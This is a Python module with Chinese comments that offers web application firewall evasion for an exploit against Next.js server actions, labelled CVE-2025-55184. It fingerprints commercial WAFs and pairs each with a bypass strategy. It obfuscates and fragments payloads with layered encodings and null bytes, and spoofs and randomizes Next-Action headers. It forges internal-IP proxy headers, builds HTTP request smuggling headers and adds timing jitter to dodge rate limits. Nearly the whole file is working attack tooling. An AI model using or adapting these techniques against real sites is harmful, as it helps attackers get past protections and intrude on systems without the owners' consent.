#!/usr/bin/env python3
"""
WAF 绕过模块 - CVE-2025-55184 的高级规避技术
作者: CyberTechAjju
"""

import random
import base64
import urllib.parse
import re
from typing import Dict, List, Tuple


class WAFBypass:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
        ]
        
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf_clearance'],
            'aws_waf': ['x-amzn-requestid', 'x-amz-cf-id', 'awselb'],
            'akamai': ['akamai', 'ak-bmsc', 'bm-sv'],
            'imperva': ['incap_ses', 'visid_incap', 'incapsula'],
            'f5': ['x-wa-info', 'bigipserver', 'f5-'],
            'sucuri': ['x-sucuri-id', 'sucuri', 'x-sucuri-cache'],
            'wordfence': ['wordfence', 'wfwaf'],
            'modsecurity': ['mod_security', 'naxsi']
        }
        
    def detect_waf(self, response_headers: Dict, response_text: str = "") -> Dict:
        """检测Web应用程序防火墙"""
        detected_wafs = []
        
        # 检查头部
        header_str = str(response_headers).lower()
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if signature.lower() in header_str:
                    detected_wafs.append(waf_name)
                    break
        
        # 检查响应体
        if response_text:
            response_lower = response_text.lower()
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if signature.lower() in response_lower:
                        if waf_name not in detected_wafs:
                            detected_wafs.append(waf_name)
                        break
        
        if detected_wafs:
            return {
                'detected': True,
                'type': ', '.join(detected_wafs),
                'confidence': 90 if len(detected_wafs) > 0 else 60,
                'bypass_available': True
            }
        else:
            return {
                'detected': False,
                'type': None,
                'confidence': 0,
                'bypass_available': False
            }
    
    def get_random_user_agent(self) -> str:
        """获取随机用户代理"""
        return random.choice(self.user_agents)
    
    def obfuscate_headers(self, headers: Dict) -> Dict:
        """混淆HTTP头部以绕过WAF"""
        obfuscated = headers.copy()
        
        # 随机化头部大小写（某些WAF区分大小写）
        new_headers = {}
        for key, value in obfuscated.items():
            # 随机更改大小写
            if random.random() > 0.5:
                new_key = self._randomize_case(key)
            else:
                new_key = key
            new_headers[new_key] = value
        
        # 添加随机合法头部以融入环境
        legitimate_headers = [
            ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            ('Accept-Language', 'en-US,en;q=0.5'),
            ('Accept-Encoding', 'gzip, deflate'),
            ('DNT', '1'),
            ('Connection', 'keep-alive'),
            ('Upgrade-Insecure-Requests', '1')
        ]
        
        for header, value in random.sample(legitimate_headers, k=random.randint(2, 4)):
            if header not in new_headers:
                new_headers[header] = value
        
        # 添加随机用户代理
        new_headers['User-Agent'] = self.get_random_user_agent()
        
        return new_headers
    
    def _randomize_case(self, text: str) -> str:
        """随机更改字符串大小写"""
        result = []
        for char in text:
            if random.random() > 0.5:
                result.append(char.upper())
            else:
                result.append(char.lower())
        return ''.join(result)
    
    def encode_payload(self, payload: str, encoding_type: str) -> str:
        """使用各种技术编码载荷"""
        if encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding_type == 'url':
            return urllib.parse.quote(payload)
        
        elif encoding_type == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        
        elif encoding_type == 'unicode':
            return ''.join([f'\\u{ord(c):04x}' for c in payload])
        
        elif encoding_type == 'hex':
            return ''.join([f'\\x{ord(c):02x}' for c in payload])
        
        elif encoding_type == 'mixed':
            # 混合不同编码技术
            result = []
            for i, char in enumerate(payload):
                technique = random.choice(['normal', 'unicode', 'hex', 'url'])
                if technique == 'unicode':
                    result.append(f'\\u{ord(char):04x}')
                elif technique == 'hex':
                    result.append(f'\\x{ord(char):02x}')
                elif technique == 'url':
                    result.append(urllib.parse.quote(char))
                else:
                    result.append(char)
            return ''.join(result)
        
        elif encoding_type == 'null_byte':
            # 插入空字节
            return payload.replace('$', '$\\x00')
        
        else:
            return payload
    
    def fragment_payload(self, payload: str) -> List[Tuple[str, str]]:
        """将载荷分片到多个表单字段中"""
        # 将载荷分割成片段
        fragments = []
        
        # 方法1：逐字符分割
        for i, char in enumerate(payload):
            fragments.append((f"field_{i}", char))
        
        return fragments
    
    def apply_timing_variation(self) -> float:
        """返回随机延迟以避免速率限制检测"""
        return random.uniform(0.5, 3.0)
    
    def get_bypass_headers(self, framework: str = 'nextjs') -> List[Dict]:
        """获取用于WAF绕过的各种头部组合"""
        base_headers = []
        
        if framework == 'nextjs':
            # 标准Next.js头部
            base_headers.append({'Next-Action': 'x'})
            
            # 大小写变化
            base_headers.append({'next-action': 'x'})
            base_headers.append({'NEXT-ACTION': 'x'})
            base_headers.append({'NeXt-AcTiOn': 'x'})
            
            # 替代Next.js头部
            base_headers.append({'Next-Router-State-Tree': '1'})
            base_headers.append({'X-Next-Action': 'x'})
            base_headers.append({'RSC': '1'})
            
            # 带空字节的头部
            base_headers.append({'Next-Action\\x00': 'x'})
            
            # 带额外空格的头部
            base_headers.append({'Next-Action ': ' x'})
            base_headers.append({' Next-Action': 'x '})
            
        elif framework == 'waku':
            base_headers.append({'RSC': '1'})
            base_headers.append({'X-RSC': '1'})
            
        elif framework == 'remix':
            base_headers.append({'X-Remix': '1'})
            
        return base_headers
    
    def get_content_type_variations(self) -> List[str]:
        """获取各种Content-Type头部变化"""
        return [
            'multipart/form-data',
            'multipart/form-data; boundary=----WebKitFormBoundary',
            'multipart/form-data; boundary=----',
            'application/x-www-form-urlencoded',
            'application/x-www-form-urlencoded; charset=UTF-8',
            'text/plain',
            'text/plain; charset=UTF-8',
            'application/octet-stream'
        ]
    
    def create_evasion_chain(self, payload: str, techniques: List[str]) -> str:
        """按顺序应用多种规避技术"""
        result = payload
        for technique in techniques:
            result = self.encode_payload(result, technique)
        return result
    
    def get_proxy_headers(self) -> Dict:
        """生成看起来像来自代理/CDN的头部"""
        proxy_headers = {}
        
        # 假代理头部
        fake_ips = [
            '127.0.0.1',
            '10.0.0.1',
            '192.168.1.1',
            '172.16.0.1'
        ]
        
        proxy_headers['X-Forwarded-For'] = random.choice(fake_ips)
        proxy_headers['X-Real-IP'] = random.choice(fake_ips)
        proxy_headers['X-Originating-IP'] = random.choice(fake_ips)
        proxy_headers['X-Remote-IP'] = random.choice(fake_ips)
        proxy_headers['X-Client-IP'] = random.choice(fake_ips)
        
        return proxy_headers
    
    def http_smuggling_headers(self) -> Dict:
        """生成用于HTTP请求走私尝试的头部"""
        smuggling_headers = {}
        
        # CL.TE (Content-Length, Transfer-Encoding)
        smuggling_headers['Transfer-Encoding'] = 'chunked'
        smuggling_headers['Content-Length'] = '0'
        
        # 添加空格/制表符以制造歧义
        variations = [
            {'Transfer-Encoding ': 'chunked'},
            {'Transfer-Encoding\t': 'chunked'},
            {' Transfer-Encoding': 'chunked'},
        ]
        
        return random.choice([smuggling_headers] + variations)
    
    def generate_bypass_strategy(self, waf_type: str) -> Dict:
        """为检测到的WAF生成特定绕过策略"""
        strategies = {
            'cloudflare': {
                'techniques': ['unicode', 'double_url'],
                'headers': ['obfuscate', 'add_proxy'],
                'timing': 'variable',
                'description': '使用Unicode编码和代理头部绕过Cloudflare'
            },
            'aws_waf': {
                'techniques': ['base64', 'url'],
                'headers': ['case_variation', 'add_proxy'],
                'timing': 'fast',
                'description': '使用base64编码和大小写变化绕过AWS WAF'
            },
            'akamai': {
                'techniques': ['hex', 'mixed'],
                'headers': ['smuggling', 'obfuscate'],
                'timing': 'slow',
                'description': '使用十六进制编码和HTTP走私绕过Akamai'
            },
            'imperva': {
                'techniques': ['double_url', 'null_byte'],
                'headers': ['obfuscate', 'add_proxy'],
                'timing': 'variable',
                'description': '使用双重编码和空字节绕过Imperva'
            },
            'default': {
                'techniques': ['url', 'base64'],
                'headers': ['obfuscate'],
                'timing': 'normal',
                'description': '使用URL和base64编码的通用WAF绕过'
            }
        }
        
        return strategies.get(waf_type, strategies['default'])


# 工具函数
def test_waf_bypass():
    """测试WAF绕过功能"""
    waf = WAFBypass()
    
    # 测试载荷编码
    test_payload = '"$@0"'
    
    print("测试编码方法:")
    encodings = ['base64', 'url', 'double_url', 'unicode', 'hex', 'mixed']
    for encoding in encodings:
        encoded = waf.encode_payload(test_payload, encoding)
        print(f"{encoding}: {encoded}")
    
    # 测试头部混淆
    print("\n测试头部混淆:")
    original_headers = {'Next-Action': 'x', 'Content-Type': 'multipart/form-data'}
    obfuscated = waf.obfuscate_headers(original_headers)
    print(f"原始: {original_headers}")
    print(f"混淆后: {obfuscated}")


if __name__ == "__main__":
    test_waf_bypass()